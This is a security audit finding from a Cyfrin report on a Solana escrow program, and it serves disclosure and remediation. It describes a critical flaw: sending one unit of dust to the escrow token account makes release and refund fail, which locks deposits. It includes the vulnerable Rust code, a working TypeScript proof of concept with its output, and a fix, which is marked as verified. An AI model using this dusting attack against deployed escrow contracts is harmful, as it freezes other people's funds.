---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-08-29-cyfrin-atum-solana-v2-0-0-0
ingested_at: '2026-10-04T10:45:09Z'
protocol_category: []
published_at: '2025-08-29T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-29-cyfrin-atum-solana-v2.0.md
tags:
- firm:cyfrin
- report:2025-08-29-cyfrin-atum-solana-v2-0
title: Sending dust to `escrow_ata` causes DoS over `release` and `refund` locking
  the funds
vuln_class: []
---

# Sending dust to `escrow_ata` causes DoS over `release` and `refund` locking the funds

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2025-08-29-cyfrin-atum-solana-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-29-cyfrin-atum-solana-v2.0.md)_

---

**Description:** Both `release` and `refund` transfer exactly `deposit.amount` from the escrow token account (`escrow_ata`, owned by the `deposit` PDA) and then call `token::close_account`. Any third party can send the smallest token unit to `escrow_ata` beforehand. That leaves `escrow_ata.amount = deposit.amount + 1` (or more). After the transfer of `deposit.amount`, a non-zero remainder remains, so `close_account` fails because the token prgram requires a zero token balance to close. The instruction reverts, blocking settlement. Since only the program PDA can sign for `escrow_ata`, users cannot self-remediate.

```rust
// 4. Transfers and Closure (no fee)
let net = deposit.amount;
let bump = ctx.bumps.deposit;
let bump_binding = [bump];
let deposit_seeds = [
    b"deposit".as_ref(),
    deposit.depositor.as_ref(),
    payment_id.as_ref(),
    bump_binding.as_ref(),
];
let signer_seeds = [&deposit_seeds[..]];
let deposit_authority_info = ctx.accounts.deposit_authority.to_account_info();
token::transfer_checked(
    CpiContext::new_with_signer(
        ctx.accounts.token_program.to_account_info(),
        TransferChecked {
            from: ctx.accounts.escrow_ata.to_account_info(),
            to: ctx.accounts.recipient_ata.to_account_info(),
            authority: deposit_authority_info.clone(),
            mint: ctx.accounts.mint.to_account_info(),
        },
        &signer_seeds,
    ),
    net,
    ctx.accounts.mint.decimals,
)?;

// Close Escrow ATA
token::close_account(CpiContext::new_with_signer(
    ctx.accounts.token_program.to_account_info(),
    CloseAccount {
        account: ctx.accounts.escrow_ata.to_account_info(),
        destination: ctx.accounts.payer.to_account_info(),
        authority: deposit_authority_info,
    },
    &signer_seeds,
))?;
```
```rust
// 3. Transfer and Closure
let deposit_amount = deposit.amount;

let bump = ctx.bumps.deposit;
let bump_binding = [bump];
let deposit_seeds = [
    b"deposit".as_ref(),
    deposit.depositor.as_ref(),
    payment_id.as_ref(),
    bump_binding.as_ref(),
];
let signer_seeds = [&deposit_seeds[..]];
let deposit_authority_info = ctx.accounts.deposit_authority.to_account_info();

token::transfer_checked(
    CpiContext::new_with_signer(
        ctx.accounts.token_program.to_account_info(),
        TransferChecked {
            from: ctx.accounts.escrow_ata.to_account_info(),
            to: ctx.accounts.depositor_ata.to_account_info(),
            authority: deposit_authority_info.clone(),
            mint: ctx.accounts.mint.to_account_info(),
        },
        &signer_seeds,
    ),
    deposit_amount,
    ctx.accounts.mint.decimals,
)?;

// Close Escrow ATA
token::close_account(CpiContext::new_with_signer(
    ctx.accounts.token_program.to_account_info(),
    CloseAccount {
        account: ctx.accounts.escrow_ata.to_account_info(),
        destination: ctx.accounts.payer.to_account_info(),
        authority: deposit_authority_info,
    },
    &signer_seeds,
))?;
```

**Impact:** Funds cannot be released or refunded, effectively locking the deposit.

**Proof of Concept:**
- The following PoC can be run inside `04_post_deposit_flows.ts`:
```typescript
// Release
it.only("PoC: DoS on release by sending one wei to escrowAta ", async () => {
  // 1) Reserve the deposit to a fresh recipient using a valid Ed25519 sig
  const recipient = await generateFundedKeypair();
  const reserveMessage = await createMessage("reserve", [
    paymentId,
    recipient.publicKey.toBuffer(),
    depositor.publicKey.toBuffer(),
  ]);
  const reserveEd25519Instruction = createEd25519Instruction(
    reserver,
    reserveMessage
  );

  console.log("[reserve] paymentId:", Buffer.from(paymentId).toString("hex"));
  console.log("[reserve] recipient:", recipient.publicKey.toBase58());
  console.log("[reserve] depositor:", depositor.publicKey.toBase58());
  console.log("[reserve] deposit PDA:", deposit.toBase58());
  console.log("[reserve] escrow ATA:", escrowAta.toBase58());

  await escrowProgram.methods
    .reserve(Array.from(paymentId), recipient.publicKey)
    .accountsPartial({
      deposit,
      instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
    })
    .preInstructions([reserveEd25519Instruction])
    .rpc();

  // 2) Fetch recipient ATA and balances before dusting
  const recipientAta = await getOrCreateAssociatedTokenAccount(
    mint,
    recipient.publicKey
  );
  const recipientAtaBefore = await getAccount(
    provider.connection,
    recipientAta
  );
  const escrowAtaBefore = await getAccount(provider.connection, escrowAta);

  console.log("[before dust] recipient ATA:", recipientAta.toBase58(), "amount:", recipientAtaBefore.amount.toString());
  console.log("[before dust] escrow ATA:", escrowAta.toBase58(), "amount:", escrowAtaBefore.amount.toString());

  // 3) Prepare valid release signature
  const releaseMessage = await createMessage("release", [
    paymentId,
    depositor.publicKey.toBuffer(),
  ]);
  const releaseEd25519Instruction = createEd25519Instruction(
    releaser,
    releaseMessage
  );

  // 4) Third party dusts the escrow ATA with 1 unit to trigger close failure
  const authorityTokenAccount = await getAssociatedTokenAddress(
    mint,
    provider.wallet.publicKey
  );
  const transferTx = new Transaction().add(
    createTransferInstruction(
      authorityTokenAccount,
      escrowAta,
      provider.wallet.publicKey,
      BigInt(1) // Transfer 1 smallest unit (dust)
    )
  );

  const dustSig = await sendAndConfirmTransaction(provider.connection, transferTx, [
    provider.wallet.payer,
  ]);
  console.log("[dust] sent +1 unit to escrow ATA, tx:", dustSig);

  const escrowAtaAfterDust = await getAccount(provider.connection, escrowAta);
  console.log("[after dust] escrow ATA amount:", escrowAtaAfterDust.amount.toString());

  // 5) Attempt release: program transfers exactly deposit.amount, then tries to close and fails
  try {
    await escrowProgram.methods
      .release(Array.from(paymentId))
      .accountsPartial({
        deposit,
        depositAuthority: deposit,
        escrowAta,
        recipientAta,
        mint,
        payer: payer.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      })
      .preInstructions([releaseEd25519Instruction])
      .signers([payer])
      .rpc();
    throw new Error("Expected release to fail, but it succeeded")
  } catch (err) {
    console.log("[release] expected failure message:", String(err));
    expect(err.toString()).to.include(
      "Error: Non-native account can only be closed if its balance is zero"
    );
  }

  // 6) Optional: show balances unchanged after the failed attempt
  const escrowAtaAfterFail = await getAccount(provider.connection, escrowAta);
  const recipientAtaAfterFail = await getAccount(provider.connection, recipientAta);
  console.log("[after fail] escrow ATA amount:", escrowAtaAfterFail.amount.toString());
  console.log("[after fail] recipient ATA amount:", recipientAtaAfterFail.amount.toString());
});

// Refund
it.only("PoC: DoS on refund by sending one wei to escrowAta", async () => {
  // 1) Prepare valid refund signature
  const refundMessage = await createMessage("refund", [
    paymentId,
    depositor.publicKey.toBuffer(),
  ]);
  const refundEd25519Instruction = createEd25519Instruction(
    releaser,
    refundMessage
  );

  console.log("[refund] paymentId:", Buffer.from(paymentId).toString("hex"));
  console.log("[refund] depositor:", depositor.publicKey.toBase58());
  console.log("[refund] deposit PDA:", deposit.toBase58());
  console.log("[refund] escrow ATA:", escrowAta.toBase58());
  console.log("[refund] depositor ATA:", authorityAta.toBase58());

  // 2) Record balances before dusting
  const authorityAtaBefore = await getAccount(
    provider.connection,
    authorityAta
  );
  const escrowAtaBefore = await getAccount(provider.connection, escrowAta);

  console.log("[before dust] depositor ATA amount:", authorityAtaBefore.amount.toString());
  console.log("[before dust] escrow ATA amount:", escrowAtaBefore.amount.toString());

  // 3) Third party dusts the escrow ATA with 1 unit to trigger close failure
  const authorityTokenAccount = await getAssociatedTokenAddress(
    mint,
    provider.wallet.publicKey
  );
  const transferTx = new Transaction().add(
    createTransferInstruction(
      authorityTokenAccount,
      escrowAta,
      provider.wallet.publicKey,
      BigInt(1) // Transfer 1 smallest unit (dust)
    )
  );

  const dustSig = await sendAndConfirmTransaction(provider.connection, transferTx, [
    provider.wallet.payer,
  ]);
  console.log("[dust] sent +1 unit to escrow ATA, tx:", dustSig);

  const escrowAtaAfterDust = await getAccount(provider.connection, escrowAta);
  console.log("[after dust] escrow ATA amount:", escrowAtaAfterDust.amount.toString());

  // 4) Attempt refund: program transfers exactly deposit.amount, then tries to close and fails
  try {
    await escrowProgram.methods
      .refund(Array.from(paymentId))
      .accountsPartial({
        deposit,
        depositAuthority: deposit,
        escrowAta,
        depositorAta: authorityAta,
        mint,
        payer: payer.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
      })
      .preInstructions([refundEd25519Instruction])
      .signers([payer])
      .rpc();
    throw new Error("Expected refund to fail, but it succeeded")
  } catch (err) {
    console.log("[refund] expected failure message:", String(err));
    expect(err.toString()).to.include(
      "Error: Non-native account can only be closed if its balance is zero"
    );
  }

  // 5) Optional: show balances unchanged after the failed attempt
  const escrowAtaAfterFail = await getAccount(provider.connection, escrowAta);
  const authorityAtaAfterFail = await getAccount(provider.connection, authorityAta);
  console.log("[after fail] escrow ATA amount:", escrowAtaAfterFail.amount.toString());
  console.log("[after fail] depositor ATA amount:", authorityAtaAfterFail.amount.toString());
});
```
- Output:
```bash
  4. Post-Deposit Flows
[reserve] paymentId: 556d3e35431bebd3f7718ac566ee42c7c3322a20369af6e0048fdcaf6b7f4864
[reserve] recipient: 7c3NoqdB4cBXJt5tg9tEgP4krzcfR84WtYkLi7TXBByS
[reserve] depositor: CLMX5wDFqnCy9PmiKWQv1BmBg2winUq88USBhuG7bvwL
[reserve] deposit PDA: 64pRsYBbZ359KuYG25qpc8YSuwYHLPWkm97xktRU1fGh
[reserve] escrow ATA: 6TJj5kqhapBbGUzn1NBNgdbJVqMby8V2M7vTdZ3kzTeo
[before dust] recipient ATA: D2i5QFyUS1mYrD1zkzB2e1TodREoQS37SUxxqy7femnw amount: 0
[before dust] escrow ATA: 6TJj5kqhapBbGUzn1NBNgdbJVqMby8V2M7vTdZ3kzTeo amount: 50000000
[dust] sent +1 unit to escrow ATA, tx: 3Lf9eihZMjiXVmdwycQuieiB11b5NmyqY7PGHPWJnyk7Jx1oUXPuJZxy4nJBMbVoeQBviEMWTXFpNhCaq5xFbZqS
[after dust] escrow ATA amount: 50000001
[release] expected failure message: Error: Simulation failed.
Message: Transaction simulation failed: Error processing Instruction 1: custom program error: 0xb.
Logs:
[
  "Program log: Instruction: TransferChecked",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 6174 of 179862 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
  "Program log: Instruction: CloseAccount",
  "Program log: Error: Non-native account can only be closed if its balance is zero",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 2776 of 171181 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: custom program error: 0xb",
  "Program HuBE5XWDSKpxeQUTRp4BwVCV1c77FL5EQX5Q4xFogQbD consumed 34595 of 203000 compute units",
  "Program HuBE5XWDSKpxeQUTRp4BwVCV1c77FL5EQX5Q4xFogQbD failed: custom program error: 0xb"
].
Catch the `SendTransactionError` and call `getLogs()` on it for full details.
[after fail] escrow ATA amount: 50000001
[after fail] recipient ATA amount: 0
    ✔ PoC: DoS on release by sending one wei to escrowAta  (1889ms)
[refund] paymentId: f602a827cf9cc88744f012f2591decf667acb1b2ba6c7bd4938870f209fdfb0e
[refund] depositor: CLMX5wDFqnCy9PmiKWQv1BmBg2winUq88USBhuG7bvwL
[refund] deposit PDA: AiphzRswQjHDd4iNP9DXm89gMzi6sj9pc5zc95K3hXuu
[refund] escrow ATA: H9V5dPqcZuk7dmgFUuV4rJ1stqP7kKET94TC6sxYZLmB
[refund] depositor ATA: HHXxRkGDsS5tfF5QHZCN3a8Ts8DgPpdYYjcFh1rx72PT
[before dust] depositor ATA amount: 700000000
[before dust] escrow ATA amount: 50000000
[dust] sent +1 unit to escrow ATA, tx: 3SdbC6VeCG5uvrRZtMBNkNNHbmhGC2NHG8UefwUkCuB93SVMMdTLS7wX7dHneKQsisnMGdmbcE59LpzGZ6kF2u3Y
[after dust] escrow ATA amount: 50000001
[refund] expected failure message: Error: Simulation failed.
Message: Transaction simulation failed: Error processing Instruction 1: custom program error: 0xb.
Logs:
[
  "Program log: Instruction: TransferChecked",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 6219 of 182903 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
  "Program log: Instruction: CloseAccount",
  "Program log: Error: Non-native account can only be closed if its balance is zero",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 2776 of 174287 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: custom program error: 0xb",
  "Program HuBE5XWDSKpxeQUTRp4BwVCV1c77FL5EQX5Q4xFogQbD consumed 31489 of 203000 compute units",
  "Program HuBE5XWDSKpxeQUTRp4BwVCV1c77FL5EQX5Q4xFogQbD failed: custom program error: 0xb"
].
Catch the `SendTransactionError` and call `getLogs()` on it for full details.
[after fail] escrow ATA amount: 50000001
[after fail] depositor ATA amount: 700000000
    ✔ PoC: DoS on refund by sending one wei to escrowAta (495ms)
```

**Recommended Mitigation:** Read the current `escrow_ata.amount` at runtime and transfer that amount, not `deposit.amount`, then close.
  ```rust
  let to_send = ctx.accounts.escrow_ata.amount;
  token::transfer_checked(/* with signer */, to_send, ctx.accounts.mint.decimals)?;
  token::close_account(/* with signer */)?;
  ```

**Atum:**
Fixed in [1311b78](https://github.com/Atum-Labs/solana-escrow/commit/1311b78ca3aa8fd260d3bf2fb0dc29dddd5c7015).

**Cyfrin:** Verified.



\clearpage
